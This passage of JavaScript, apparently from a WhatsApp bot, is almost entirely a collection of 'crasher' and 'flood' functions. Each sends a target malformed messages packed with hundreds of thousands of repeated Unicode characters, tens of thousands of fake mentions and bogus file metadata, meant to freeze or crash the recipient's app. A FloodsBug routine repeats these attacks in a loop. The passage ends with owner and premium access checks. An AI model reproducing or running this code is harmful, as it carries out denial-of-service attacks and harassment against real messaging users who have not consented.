rwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
                caption: "This is an ad caption",
              },
              placeholderKey: {
                remoteJid: "0@s.whatsapp.net",
                fromMe: false,
                id: "ABCDEF1234567890",
              },
              expiration: 86400,
              ephemeralSettingTimestamp: "1728090592378",
              ephemeralSharedSecret:
                "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
              externalAdReply: {
                title: "TROPIC - CRITICAL FINISH",
                body: "PETRA INFERNOX IS HERE" + "𑜦࣯".repeat(200),
                mediaType: "VIDEO",
                renderLargerThumbnail: true,
                previewTtpe: "VIDEO",
                thumbnail:
                  "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7p5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
                sourceType: " x ",
                sourceId: " x ",
                sourceUrl: "https://www.instagram.com/WhatsApp",
                mediaUrl: "https://www.instagram.com/WhatsApp",
                containsAutoReply: true,
                renderLargerThumbnail: true,
                showAdAttribution: true,
                ctwaClid: "ctwa_clid_example",
                ref: "ref_example",
              },
              entryPointConversionSource: "entry_point_source_example",
              entryPointConversionApp: "entry_point_app_example",
              entryPointConversionDelaySeconds: 5,
              disappearingMode: {},
              actionLink: {
                url: "https://www.instagram.com/WhatsApp",
              },
              groupSubject: "Example Group Subject",
              parentGroupJid: "6287888888888-1234567890@g.us",
              trustBannerType: "trust_banner_example",
              trustBannerAction: 1,
              isSampled: false,
              utm: {
                utmSource: "utm_source_example",
                utmCampaign: "utm_campaign_example",
              },
              forwardedNewsletterMessageInfo: {
                newsletterJid: "6287888888888-1234567890@g.us",
                serverMessageId: 1,
                newsletterName: " target ",
                contentType: "UPDATE",
                accessibilityText: " target ",
              },
              businessMessageForwardInfo: {
                businessOwnerJid: "0@s.whatsapp.net",
              },
              smbClientCampaignId: "smb_Alfaofficial_campaign_id_example",
              smbServerCampaignId: "smb_server_campaign_id_example",
              dataSharingContext: {
                showMmDisclosure: true,
              },
            },
          },
        },
        Ptcp
          ? {
              participant: {
                jid: target,
              },
            }
          : {}
      );
    }


async function BugDoc3(target) {
      let virtex = "📄𝗙𝗿𝗲𝗲𝘇𝗲𝗗𝗼𝗰𝘂𝗺𝗲𝗻𝘁";

      client.relayMessage(
        target,
        {
          groupMentionedMessage: {
            message: {
              interactiveMessage: {
                header: {
                  documentMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
                    mimetype:
                      "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                    fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                    fileLength: "999999999",
                    pageCount: 0x9184e729fff,
                    mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                    fileName: virtex,
                    fileEncSha256:
                      "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                    directPath:
                      "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1715880173",
                    contactVcard: true,
                  },
                  hasMediaAttachment: true,
                },
                body: {
                  text:
                    "𝐏𝐞𝐭𝐫𝐚𝐖𝐚𝐧𝐠𝐜𝐚𝐟" + "ꦾ".repeat(50000) + "@1".repeat(90000),
                },
                nativeFlowMessage: {},
                contextInfo: {
                  mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                  groupMentions: [
                    { groupJid: "1@newsletter", groupSubject: "「 GOKU REVOLUTION 」" },
                  ],
                },
              },
            },
          },
        },
        { participant: { jid: target } }
      );
    }

    //

    async function BugDoc4(target) {
      let virtex = "📄𝗗𝗼𝗰𝘂𝗺𝗲𝗻𝘁𝗧𝗿𝗮𝘀𝗵";

      client.relayMessage(
        target,
        {
          groupMentionedMessage: {
            message: {
              interactiveMessage: {
                header: {
                  documentMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
                    mimetype:
                      "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                    fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                    fileLength: "999999999",
                    pageCount: 0x9184e729fff,
                    mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                    fileName: virtex,
                    fileEncSha256:
                      "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                    directPath:
                      "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1715880173",
                    contactVcard: true,
                  },
                  hasMediaAttachment: true,
                },
                body: {
                  text:
                    "#тяαѕн ∂σ¢υмєηт\u200B" +
                    "ꦾ࣯".repeat(50000) +
                    "@1".repeat(90000),
                },
                nativeFlowMessage: {},
                contextInfo: {
                  mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                  groupMentions: [
                    { groupJid: "1@newsletter", groupSubject: "「 GOKU REVOLUTION 」" },
                  ],
                },
              },
            },
          },
        },
        { participant: { jid: target } }
      );
    }


async function MANZNEW(target, ThM, Ptcp = true) {
			await client.relayMessage(target, {
					ephemaralMessage: {
						Message: {
							interactiveMessage: {
								header: {
									documentMessage: {
										url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
										mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
										fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
										fileLength: "9999999999999",
										pageCount: 1316134911,
										mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
										fileName: "⭑̤⟅̊༑ ▾ 𝐅𝐢𝐨𝐧𝐞𝐱𝐬𝐢𝐱 𝐂𝐫𝐚𝐬𝐡𝐞𝐫⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤",
										fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
										directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
										mediaKeyTimestamp: "1726867151",
										contactVcard: true,
										jpegThumbnail: ThM,
									},
									hasMediaAttachment: true,
								},
								body: {
									text: "⭑̤⟅̊༑ ▾ 𝐒𝐭𝐮𝐩𝐢𝐭 𝐂𝐫𝐚𝐬𝐡𝐞𝐫⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤\n" + "@6281991410940".repeat(17000),
								},
								nativeFlowMessage: {
									buttons: [{
											name: "cta_url",
											buttonParamsJson: "{ display_text: '🎭⃟༑⌁⃰𝐒𝐭𝐮𝐩𝐢𝐭 𝐂𝐫𝐚𝐬𝐡𝐞𝐫ཀ͜͡🐉', url: \"https://youtube.com/manzmods\", merchant_url: \"https://youtube.com/manzmods\" }",
										},
										{
											name: "call_permission_request",
											buttonParamsJson: "{}",
										},
									],
									MessageParamsJson: "{}",
								},
								contextInfo: {
									mentionedJid: ["6281991410940@s.whatsapp.net", ...Array.from({
										length: 30000
									}, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
									forwardingScore: 1,
									isForwarded: true,
									fromMe: false,
									participant: "0@s.whatsapp.net",
									remoteJid: "status@broadcast",
									quotedMessage: {
										documentMessage: {
											url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
											fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
											fileLength: "9999999999999",
											pageCount: 1316134911,
											mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
											fileName: "𝐌𝐲𝐬𝐭𝐞𝐫𝐢𝐨𝐮𝐬 𝐌𝐞𝐧 𝐈𝐧 𝐆𝐨𝐤𝐮 𝐯𝟏♻️\n" + "@6281991410940",
											fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
											directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mediaKeyTimestamp: "1724474503",
											contactVcard: true,
											thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
											thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
											thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
											jpegThumbnail: "",
										},
									},
								},
							},
						},
					},
				},
				Ptcp ? {
					participant: {
						jid: target
					}
				} : {}
			);
			console.log(chalk.red("Send Bug By Petra🐉"));
		};

async function Floods1(target) {
      client.relayMessage(
        target,
        {
          groupMentionedMessage: {
            message: {
              interactiveMessage: {
                header: {
                  locationMessage: {
                    degreesLatitude: 0,
                    degreesLongitude: 0,
                  },
                  hasMediaAttachment: true,
                },
                body: {
                  text:
                    "Hello I am goku mods" +
                    "ꦾ".repeat(120000) +
                    "@1".repeat(250000),
                },
                nativeFlowMessage: {},
                contextInfo: {
                  mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                  groupMentions: [
                    { groupJid: "1@newsletter", groupSubject: "「 Goku REVOLUTION 」" },
                  ],
                },
              },
            },
          },
        },
        { participant: { jid: target } },
        { messageId: null }
      );

      // Jeda 3 detik
      await new Promise((resolve) => setTimeout(resolve, 2000));
    }

    //

    async function Floods2(target) {
      client.relayMessage(
        target,
        {
          groupMentionedMessage: {
            message: {
              interactiveMessage: {
                header: {
                  locationMessage: {
                    degreesLatitude: 0,
                    degreesLongitude: 0,
                  },
                  hasMediaAttachment: true,
                },
                body: {
                  text:
                    "I Love You.., But... You Looser" +
                    "ꦾ".repeat(50000) +
                    "@1".repeat(120000),
                },
                nativeFlowMessage: {},
                contextInfo: {
                  mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                  groupMentions: [
                    { groupJid: "1@newsletter", groupSubject: "「 GOKU REVOLUTION 」" },
                  ],
                },
              },
            },
          },
        },
        { participant: { jid: target } },
        { messageId: null }
      );

      // Jeda 3 detik
      await new Promise((resolve) => setTimeout(resolve, 2000));
    }

    //

    async function Floods3(target) {
      client.relayMessage(
        target,
        {
          groupMentionedMessage: {
            message: {
              interactiveMessage: {
                header: {
                  locationMessage: {
                    degreesLatitude: 0,
                    degreesLongitude: 0,
                  },
                  hasMediaAttachment: true,
                },
                body: {
                  text:
                    "⿻ᬃEWE EWE EWE S⃟⃟⿻" +
                    "ꦾ".repeat(120000) +
                    "@1".repeat(250000),
                },
                nativeFlowMessage: {},
                contextInfo: {
                  mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                  groupMentions: [
                    { groupJid: "1@newsletter", groupSubject: "「 ARIFIN REVOLUTION 」" },
                  ],
                },
              },
            },
          },
        },
        { participant: { jid: target } },
        { messageId: null }
      );

      // Jeda 3 detik
      await new Promise((resolve) => setTimeout(resolve, 2000));
    }


 async function fionexsixfreze(target, Ptcp = false) {
    const mentionedJid = [
        "0@s.whatsapp.net", 
        ...Array.from({ length: 15000 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)
    ];

    const contextInfo = {
        mentionedJid, stanzaId: "1234567890ABCDEF", participant: "0@s.whatsapp.net",
        quotedMessage: { callLogMesssage: { isVideo: true, callOutcome: "1", durationSecs: "0", callType: "REGULAR",
            participants: [{ jid: "0@s.whatsapp.net", callOutcome: "1" }] } },
        remoteJid: target, forwardingScore: 9999999, isForwarded: true,
        externalAdReply: { title: "", body: "", mediaType: "VIDEO", renderLargerThumbnail: true,
            thumbnail: "https://img100.pixhost.to/images/155/533950625_skyzopedia.jpg", sourceUrl: "https://www.instagram.com/WhatsApp" }
    };

    await client.relayMessage(target, { 
        extendedTextMessage: { 
            text: "⩟⬦𪲁 𝐘𝐨𝐮𝐫 𝐏𝐡𝐨𝐧𝐞 𝐖𝐡𝐚𝐬 𝐂𝐫𝐚𝐬𝐡𝐞𝐫 -" + "@0".repeat(90000), 
            contextInfo 
        } 
    }, Ptcp ? { participant: { jid: target } } : {});
}

async function locasifreeze(target, ptcp = true) {
    await client.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "☯𓆩𝐩𝐞𝐭𝐫𝐚𓆪☯" + "@1".repeat(295000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: " VoC " }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}

async function locationcrash(target, wanted) {
var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
viewOnceMessage: {
Message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `*\`ꪶꪹFionexsixCrasher.Com᭢\`*`+"ꦾ".repeat(50000),
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
}
}), { userJid: target, quoted: wanted })
await client.relayMessage(target, etc.Message, { participant: { jid: target }, MessageId: etc.key.id })
}    

async function uilokas(target, ptcp = true) {
    await client.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "youLikeJomok?" + "ꦾ".repeat(999999)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: " VoC " }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}

async function CaTaLogCrash(target, QBug) {
      var etc = generateWAMessageFromContent(
        target,
        proto.Message.fromObject({
          viewOnceMessage: {
            message: {
              interactiveMessage: {
                header: {
                  title: "⩟⬦𪲁 Ranstamvan MODS -" + "ꦾ".repeat(90000),
                  orderMessage: {
                    orderId: "1632408257656442",
                    thumbnail: "",
                    itemCount: 99999,
                    status: "INQUIRY",
                    surface: "CATALOG",
                    message: "⿻ᬃRansMODS⃟⃟⿻" + "ꦾ".repeat(90000),
                    orderTitle: "Website Scraping",
                    sellerJid: "0@s.whatsapp.net",
                    token: "AR4ZFrA5kAE0ihvqor9jdjYaeEIEhilmElFgd2fcYz4xtw==",
                    totalAmount1000: "999999999999999999",
                    totalCurrencyCode: "IDR",
                    messageVersion: 2,
                  },
                },
              },
            },
          },
        }),
        { userJid: target, quoted: QBug }
      );
      await client.relayMessage(target, etc.message, {
        participant: { jid: target },
        messageId: etc.key.id,
      });
    }

async function XiosVirus(target) {
      client.relayMessage(
        target,
        {
          extendedTextMessage: {
            text: `⩟⬦𪲁 GOKU V1 CRASHER -` + "࣯ꦾ".repeat(90000),
            contextInfo: {
              fromMe: false,
              stanzaId: target,
              participant: target,
              quotedMessage: {
                conversation: "⿻ᬃGOKU V1⿻‌" + "ꦾ".repeat(90000),
              },
              disappearingMode: {
                initiator: "CHANGED_IN_CHAT",
                trigger: "CHAT_SETTING",
              },
            },
            inviteLinkGroupTypeV2: "DEFAULT",
          },
        },
        {
          participant: {
            jid: target,
          },
        },
        {
          messageId: null,
        }
      );
    }

async function whatsappoffcbjirrrr(target, Ptcp = true) {
      await client.relayMessage(
        target,
        {
          extendedTextMessage: {
            text:
              "⿻ B͜͡a͜͡k͜͡s͜͡o͜͡U͜͡r͜͡a͜͡t͜͡S͜͡a͜͡p͜͡i͜͡\n" +
              "ꦾ".repeat(99999),
            contextInfo: {
              mentionedJid: [
                "6283187035090@s.whatsapp.net",
                ...Array.from(
                  {
                    length: 18000,
                  },
                  () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
                ),
              ],
              stanzaId: "1234567890ABCDEF",
              participant: "0@s.whatsapp.net",
              quotedMessage: {
                callLogMesssage: {
                  isVideo: true,
                  callOutcome: "1",
                  durationSecs: "0",
                  callType: "REGULAR",
                  participants: [
                    {
                      jid: "0@s.whatsapp.net",
                      callOutcome: "1",
                    },
                  ],
                },
              },
              remoteJid: target,
              conversionSource: " X ",
              conversionData:
                "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
              conversionDelaySeconds: 10,
              forwardingScore: 9999999,
              isForwarded: true,
              quotedAd: {
                advertiserName: " X ",
                mediaType: "IMAGE",
                jpegThumbnail:
                  "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
                caption: " X ",
              },
              placeholderKey: {
                remoteJid: "0@s.whatsapp.net",
                fromMe: false,
                id: "ABCDEF1234567890",
              },
              expiration: 86400,
              ephemeralSettingTimestamp: "1728090592378",
              ephemeralSharedSecret:
                "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
              externalAdReply: {
                title: "⿻ M͜͡i͜͡e͜͡A͜͡y͜͡a͜͡m͜͡E͜͡n͜͡a͜͡k͜͡",
                body: "⿻ T͜͡o͜͡k͜͡D͜͡a͜͡l͜͡a͜͡n͜͡g͜͡",
                mediaType: "VIDEO",
                renderLargerThumbnail: true,
                previewType: "VIDEO",
                thumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/...",
                sourceType: " target ",
                sourceId: " target ",
                sourceUrl: "https://whatsapp.com/channel/0029VasVXaeLSmbWWLB9Ti3i",
                mediaUrl: "https://whatsapp.com/channel/0029VasVXaeLSmbWWLB9Ti3i",
                containsAutoReply: true,
                showAdAttribution: true,
                ctwaClid: "ctwa_clid_example",
                ref: "ref_example",
              },
              entryPointConversionSource: "entry_point_source_example",
              entryPointConversionApp: "entry_point_app_example",
              entryPointConversionDelaySeconds: 5,
              disappearingMode: {},
              actionLink: {
                url: "https://whatsapp.com/channel/0029VasVXaeLSmbWWLB9Ti3i",
              },
              groupSubject: " X ",
              parentGroupJid: "6287888888888-1234567890@g.us",
              trustBannerType: " X ",
              trustBannerAction: 1,
              isSampled: false,
              utm: {
                utmSource: " X ",
                utmCampaign: " X ",
              },
              forwardedNewsletterMessageInfo: {
                newsletterJid: "6287888888888-1234567890@g.us",
                serverMessageId: 1,
                newsletterName: " X ",
                contentType: "UPDATE",
                accessibilityText: " X ",
              },
              businessMessageForwardInfo: {
                businessOwnerJid: "0@s.whatsapp.net",
              },
              smbClientCampaignId: "smb_client_campaign_id_example",
              smbServerCampaignId: "smb_server_campaign_id_example",
              dataSharingContext: {
                showMmDisclosure: true,
              },
            },
          },
        },
        Ptcp
          ? {
              participant: {
                jid: target,
              },
            }
          : {}
      );
    }

async function func1(target) {
    await client.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "⿻" + "ꦹꦹꦹ".repeat(400000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: " ⿻ " }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}

// ====================================
    //START PARAMATER FLOODS
    async function FloodsBug(target) {
      for (let i = 0; i < 10; i++) {l
        await CaTaLogCrash(target);
        await Floods1(target);
        await CrashV2(target);
        await CrashV2(target);
        await Floods3(target);
        await Floods2(target);
        await CaTaLogCrash(target);
        await Floods2(target);
        await Floods3(target);
        await Floods1(target);
        await CrashV2(target);
        await CrashV2(target);
        await Floods3(target);
        await Floods2(target);
        await Floods1(target);
        await Floods3(target);
        await CaTaLogCrash(target);
      }
      console.log(
        chalk.yellow.bold("Floods Ravage Without Mercy – The Reckoning Begins!")
      );
    }
const premium = JSON.parse(fs.readFileSync('./database/premium.json'))
const owner = JSON.parse(fs.readFileSync('./owner.json'))
const Owner = global.nomorOwner + '@s.whatsapp.net'
const isOwner = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const isPremium = [botNumber, ...premium].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
client.sendContact = async (jid, kon, quoted = '', opts = {}) => {
let list = []
for (let i of kon) {
list.push({
displayName: await deltaJomok.getName(i),
